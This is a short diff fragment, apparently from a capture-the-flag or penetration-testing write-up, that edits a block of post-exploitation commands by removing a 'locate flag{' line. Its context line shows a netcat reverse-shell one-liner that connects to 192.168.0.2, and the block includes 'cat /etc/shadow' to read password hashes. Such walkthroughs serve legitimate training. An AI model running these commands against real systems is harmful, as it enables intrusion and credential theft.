@@ -255,7 +255,6 @@ echo "rm /tmp/pipe; mkfifo /tmp/pipe; nc 192.168.0.2 7777 0</tmp/pipe | /bin/sh 
 ```sh
 whoami
 pwd
-locate flag{
 cat /etc/shadow
 ```
 - We can read the files requiring administrative privileges
